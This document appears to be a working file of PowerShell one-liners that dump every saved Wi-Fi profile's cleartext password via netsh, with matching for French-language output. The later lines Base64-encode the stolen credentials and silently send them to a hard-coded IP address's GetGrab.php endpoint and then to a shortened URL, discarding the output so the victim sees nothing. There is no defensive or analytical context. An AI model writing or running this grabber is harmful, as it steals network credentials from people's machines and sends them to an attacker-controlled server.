(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -Wrap



(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Contenu de la clé\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -Wrap


(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Contenu de la clé\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | echo



$test = ( (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Contenu de la clé\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }})



(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Contenu de la clé\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Out-File "mdpWifi.txt"

$MYTEXT =  (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Contenu de la clé\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME123456789123456789123456789123456789=$name; PASSWORD123456789123456789123456789123456789=$pass }}
$ENCODED = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MYTEXT))
Write-Output $ENCODED


$MYTEXT= $null
$ENCODED= $null
$ENCODED2= $null
[string]$string = $null

$MYTEXT = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Contenu de la clé\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME123456789123456789123456789123456789=$name; PASSWORD123456789123456789123456789123456789=$pass }}

$string = Out-String -InputObject $MYTEXT

$ENCODED = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))



$ENCODED = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Out-String -InputObject ((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Contenu de la clé\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME123456789123456789123456789123456789=$name; PASSWORD123456789123456789123456789123456789=$pass }}))))

Invoke-WebRequest -Uri "http://141.94.206.18/GetGrab.php?var=$ENCODED"





$ENCODED = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Out-String -InputObject ((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Contenu de la clé\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME123456789123456789123456789123456789=$name; PASSWORD123456789123456789123456789123456789=$pass }}))))

Invoke-WebRequest -Uri "http://141.94.206.18/GetGrab.php?var=" $($assoc.Name)
Invoke-WebRequest -Uri "http://141.94.206.18/GetGrab.php?var=" $ENCODED







Out-String -InputObject ([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Out-String -InputObject ((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Contenu de la clé\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME123456789123456789123456789123456789=$name; PASSWORD123456789123456789123456789123456789=$pass }})))))

Invoke-WebRequest -Uri "http://141.94.206.18/GetGrab.php?var=$([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Out-String -InputObject ((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Contenu de la clé\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME123456789123456789123456789123456789=$name; PASSWORD123456789123456789123456789123456789=$pass }})))))" | Out-Null

https://tinyurl.com/bdd5j46j


Invoke-WebRequest -Uri "https://tinyurl.com/bdd5j46j?var=$([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Out-String -InputObject ((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Contenu de la clé\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME123456789123456789123456789123456789=$name; PASSWORD123456789123456789123456789123456789=$pass }})))))" | Out-Null


